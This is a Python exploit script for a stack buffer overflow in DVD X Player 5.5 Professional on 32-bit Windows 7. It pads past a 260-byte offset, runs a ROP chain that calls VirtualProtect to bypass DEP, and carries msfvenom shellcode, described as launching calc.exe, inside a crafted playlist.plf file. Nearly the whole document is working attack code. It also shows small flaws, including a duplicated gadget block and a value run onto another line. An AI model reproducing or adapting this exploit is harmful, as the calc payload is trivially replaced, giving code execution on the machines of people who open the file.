#!/usr/bin/env python2

# Title: DVD X Player 5.5 Professional (DEP, no ASLR)
# Date: XX/XX/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86import struct
# CVE : ?
import struct

def create_rop_chain():
  rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x60332a94,  # POP EAX # RETN [Configuration.dll] 
      0x60366238,  # ptr to &VirtualProtect() [IAT Configuration.dll]
      0x616306ed,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [EPG.dll] 
      0x616385d8,  # XCHG EAX,ESI # RETN 0x00 [EPG.dll]

      0x60332a94,  # POP EAX # RETN [Configuration.dll] 
      0x60366238,  # ptr to &VirtualProtect() [IAT Configuration.dll]
      0x616306ed,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [EPG.dll] 
      0x616385d8,  # XCHG EAX,ESI # RETN 0x00 [EPG.dll]

      
      #[---INFO:gadgets_to_set_ebp:---]
      0x64101bc9,  # POP EBP # RETN [NetReg.dll] 
      0x6033cdab,  # push esp # ret  |  {PAGE_EXECUTE_READ} [Configuration.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.2.5.2007 (C:\Program Files\Aviosoft\DVD X Player 5.5 Professional\Configuration.dll)
      
      #[---INFO:gadgets_to_set_ebx:---]
      0x60332a94,  # POP EAX # RETN [Configuration.dll]      0xfffffcff,  # 0x00000201-> ebx
      0xfffffcff,  # 0x00000201-> ebx
      0x60331ffc,  # NEG EAX # RETN    ** [Configuration.dll] **   |   {PAGE_EXECUTE_READ}
      0x6410b090,  # XCHG EAX,EBX # RETN    ** [NetReg.dll] **   |   {PAGE_EXECUTE_READ}
      
      #[---INFO:gadgets_to_set_edx:---]
      0x60332a94,  # POP EAX # RETN [Configuration.dll]
      0xffffffc0,  # 0x0000040-> edx
      0x60331ffc,  # NEG EAX # RETN    ** [Configuration.dll] **   |   {PAGE_EXECUTE_READ}
      0x61608ba2,  # XCHG EAX,EDX # RETN    ** [Configuration.dll] **   |   {PAGE_EXECUTE_READWRITE}
      
      #[---INFO:gadgets_to_set_ecx:---]
      0x641064f8,  # POP ECX # RETN [NetReg.dll] 
      0x6411b797,  # &Writable location [VersionInfo.dll]

      #[---INFO:gadgets_to_set_edi:---]
      0x64036676,  # POP EDI # RETN [MediaPlayerCtrl.dll] 
      0x64041804,  # RETN (ROP NOP) [MediaPlayerCtrl.dll]
  
      #[---INFO:gadgets_to_set_eax:---]
      0x641066de,  # POP EAX # RETN [NetReg.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x60358092,  # PUSHAD # RETN [Configuration.dll] 
  ]
  return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

offset=260

# msfvenom -p windows/exec cmd=calc.exe -b "\x0a\x00\x0d\x1a" -f python -v shellcode
shellcode =  b""
shellcode += b"\xba\x53\xaf\x9e\xdb\xd9\xc2\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x31\x31\x56\x13\x83\xee\xfc"
shellcode += b"\x03\x56\x5c\x4d\x6b\x27\x8a\x13\x94\xd8\x4a"
shellcode += b"\x74\x1c\x3d\x7b\xb4\x7a\x35\x2b\x04\x08\x1b"
shellcode += b"\xc7\xef\x5c\x88\x5c\x9d\x48\xbf\xd5\x28\xaf"
shellcode += b"\x8e\xe6\x01\x93\x91\x64\x58\xc0\x71\x55\x93"
shellcode += b"\x15\x73\x92\xce\xd4\x21\x4b\x84\x4b\xd6\xf8"
shellcode += b"\xd0\x57\x5d\xb2\xf5\xdf\x82\x02\xf7\xce\x14"
shellcode += b"\x19\xae\xd0\x97\xce\xda\x58\x80\x13\xe6\x13"
shellcode += b"\x3b\xe7\x9c\xa5\xed\x36\x5c\x09\xd0\xf7\xaf"
shellcode += b"\x53\x14\x3f\x50\x26\x6c\x3c\xed\x31\xab\x3f"
shellcode += b"\x29\xb7\x28\xe7\xba\x6f\x95\x16\x6e\xe9\x5e"

shellcode += b"\x14\xdb\x7d\x38\x38\xda\x52\x32\x44\x57\x55"
shellcode += b"\x95\xcd\x23\x72\x31\x96\xf0\x1b\x60\x72\x56"
shellcode += b"\x23\x72\xdd\x07\x81\xf8\xf3\x5c\xb8\xa2\x99"
shellcode += b"\xa3\x4e\xd9\xef\xa4\x50\xe2\x5f\xcd\x61\x69"
shellcode += b"\x30\x8a\x7d\xb8\x75\x64\x34\xe1\xdf\xed\x91"
shellcode += b"\x73\x62\x70\x22\xae\xa0\x8d\xa1\x5b\x58\x6a"
shellcode += b"\xb9\x29\x5d\x36\x7d\xc1\x2f\x27\xe8\xe5\x9c"
shellcode += b"\x48\x39\x86\x43\xdb\xa1\x67\xe6\x5b\x43\x78"

rop_chain = create_rop_chain()


#buf = pattern
buf  = "A"*offset
buf += rop_chain
buf += "\x90" * 30
buf += shellcode




f = open("playlist.plf", "w")
f.write(buf)
f.close()
